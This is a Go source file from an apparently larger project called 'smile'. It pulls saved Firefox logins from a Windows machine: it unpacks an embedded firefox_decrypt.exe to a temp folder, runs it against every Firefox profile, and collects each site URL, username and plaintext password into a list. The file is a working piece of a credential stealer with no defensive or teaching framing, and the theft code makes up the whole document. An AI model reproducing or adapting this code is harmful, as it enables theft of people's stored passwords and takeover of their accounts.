package browsers

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"smile/static"
	"strings"
)

var (
	FIREFOX_PROFILES = filepath.Join(APPDATA, "Mozilla", "Firefox", "Profiles")
)

func Firefox() []Credential {
	credentials := []Credential{}

	// Copy the static content to a temporary directory
	tempDir, err := copyStaticToTemp()
	if err != nil {
		fmt.Println("Error copying static to temp:", err)
		return credentials
	}
	defer os.RemoveAll(tempDir)

	// Access the embedded firefox_decrypt.exe file from the temporary directory
	tempExePath := filepath.Join(tempDir, "firefox_decrypt.exe")

	// Get all profiles
	profiles, err := exec.Command(`cmd`, `/c`, `dir`, FIREFOX_PROFILES, `/b`).Output()
	if err != nil {
		fmt.Println("Error getting profiles:", err)
		return credentials
	}

	re := regexp.MustCompile(`\s+`)
	profileSplit := re.Split(string(profiles), -1)
	for _, profile := range profileSplit {
		if profile == "" {
			continue
		}
		cmd := exec.Command("cmd", "/C", tempExePath, filepath.Join(FIREFOX_PROFILES, profile))
		out, err := cmd.Output()
		if err != nil {
			fmt.Println("Error executing command:", err)
			return credentials
		}

		for _, line := range strings.Split(string(out), "\n") {
			reURL := regexp.MustCompile("^Website: ")
			reUser := regexp.MustCompile("^Username: ")
			rePass := regexp.MustCompile("^Password: ")
			if reURL.MatchString(line) {
				credentials = append(credentials, Credential{
					Browser: "Firefox",
					URL:     strings.Replace(line, "Website: ", "", -1),
				})
			} else if reUser.MatchString(line) {
				re := regexp.MustCompile("^Username: |'")
				line = re.ReplaceAllString(line, "")
				credentials[len(credentials)-1].Username = line
			} else if rePass.MatchString(line) {
				re := regexp.MustCompile("^Password: |'")
				line = re.ReplaceAllString(line, "")
				credentials[len(credentials)-1].Password = line
			}
		}
	}

	return credentials
}

func copyStaticToTemp() (string, error) {
	// Access the embedded static directory
	staticDir := "/firefox_decrypt/"

	// Get the list of all files and directories in the embedded static directory
	files, err := static.WalkDirs(staticDir, false)
	if err != nil {
		return "", fmt.Errorf("error walking static directory: %v", err)
	}

	tempDir, err := os.MkdirTemp("", "static_")
	if err != nil {
		return "", fmt.Errorf("error creating temporary directory: %v", err)
	}

	for _, file := range files {
		fmtFile := strings.Replace(file, "/firefox_decrypt/", "", 1)
		fileSplit := strings.Split(fmtFile, "/")
		dirPath := strings.Join(fileSplit[:len(fileSplit)-1], "/")
		os.Mkdir(filepath.Join(tempDir, dirPath), os.ModePerm)
		fileByte, err := static.ReadFile(file)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
		err = os.WriteFile(filepath.Join(tempDir, fmtFile), fileByte, os.ModePerm)
		if err != nil {
			fmt.Println(err.Error())
			continue
		}
	}

	return tempDir, nil
}
